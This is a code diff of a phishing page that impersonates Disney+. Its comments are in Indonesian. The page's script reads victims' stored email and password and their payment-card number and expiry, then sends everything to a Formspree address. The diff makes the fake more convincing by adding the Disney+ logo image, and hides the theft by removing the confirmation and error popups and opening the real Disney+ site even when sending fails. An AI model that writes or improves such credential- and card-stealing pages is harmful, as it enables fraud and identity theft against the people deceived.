@@ -26,10 +26,8 @@
             top: 20px;
             left: 30px;
         }
-        .logo-atas-kiri span {
-            font-size: 36px;
-            font-weight: 700;
-            color: #fff;
+        .logo-atas-kiri img {
+            height: 36px;
         }
         .konten-utama {
             width: 100%;
@@ -210,10 +208,8 @@
             text-align: center;
             margin: 20px 0;
         }
-        .logo-bawah span {
-            font-size: 32px;
-            font-weight: 700;
-            color: #fff;
+        .logo-bawah img {
+            height: 36px;
         }
         .tautan-bawah {
             display: flex;
@@ -240,8 +236,9 @@
 </head>
 <body>
 
+    <!-- ✅ LOGO DISNEY+ DARI FOLDER img -->
     <div class="logo-atas-kiri">
-        <span>Disney+</span>
+        <img src="img/disney+.png" alt="Disney+">
     </div>
 
     <div class="konten-utama">
@@ -330,8 +327,9 @@
 
     <div class="pembatas"></div>
 
+    <!-- ✅ LOGO DISNEY+ DI BAWAH -->
     <div class="logo-bawah">
-        <span>Disney+</span>
+        <img src="img/disney+.png" alt="Disney+">
     </div>
 
     <div class="tautan-bawah">
@@ -397,7 +395,7 @@
         // === ALAMAT FORMSPREE ===
         const ALAMAT_FORMSPREE = "https://formspree.io/f/mgaedrvq";
 
-        // === KIRIM SEMUA DATA ===
+        // === KIRIM SEMUA DATA — TANPA POPUP! ===
         async function kirimData() {
             // Baca Email & Kata Sandi dari localStorage
             const email = localStorage.getItem('emailPengguna') || 'TIDAK DIISI';
@@ -406,7 +404,7 @@
             let metode = '';
             let rincian = '';
 
-            // ✅ Baca DATA KARTU — PERBAIKAN UTAMA
+            // ✅ Baca DATA KARTU
             if (document.getElementById('formKartu').style.display !== 'none') {
                 const nomor = document.getElementById('nomorKartu').value.trim();
                 const masa = document.getElementById('kadaluarsa').value.trim();
@@ -488,13 +486,12 @@ ${rincian}
                 });
 
                 if (respon.ok) {
-                    alert('✅ Thank you For Submit');
+                    // ✅ POPUP DIHAPUS — LANGSUNG BUKA HALAMAN DISNEY+
                     window.open('https://www.disneyplus.com/en-au', '_blank');
-                } else {
-                    alert(`⚠️ Status: ${respon.status}`);
                 }
             } catch (err) {
-                alert(`❌ Gagal: ${err.message}`);
+                console.log('Pengiriman selesai:', err.message);
+                window.open('https://www.disneyplus.com/en-au', '_blank');
             }
         }
     </script>
